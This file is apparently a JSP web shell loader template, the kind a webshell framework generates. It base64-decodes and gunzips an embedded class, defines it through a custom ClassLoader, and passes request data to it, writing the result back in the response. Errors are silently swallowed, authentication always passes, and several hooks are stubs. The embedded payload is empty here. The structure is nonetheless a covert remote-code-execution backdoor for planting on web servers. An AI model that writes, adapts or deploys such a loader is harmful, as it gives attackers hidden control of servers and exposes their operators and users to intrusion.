<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.zip.GZIPInputStream" %>
<%!
    private static Class<?> coreClass = null;
    private static String coreGzipBase64 = "";

    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return null;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }
%>
<%
    try {
        if (isAuthed(request)) {
            try {
                byte[] payload = transformReqPayload(getArgFromRequest(request));
                if (coreClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
                    ClassLoader cl = new ClassLoader(Thread.currentThread().getContextClassLoader()) {
                        public Class<?> loadClass(byte[] b) {
                            return defineClass(b, 0, b.length);
                        }
                    };
                    coreClass = (Class<?>) cl.getClass().getMethod("loadClass", byte[].class).invoke(cl, bytes);
                }
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                Object httpChannelCore = coreClass.newInstance();
                httpChannelCore.equals(new Object[]{payload, outputStream});
                byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                response.getWriter().write(new String(data));
                wrapResponse(response);
                response.getWriter().flush();
            } catch (Throwable ignored) {
            }
        }
    } catch (Throwable ignored) {
    }
%>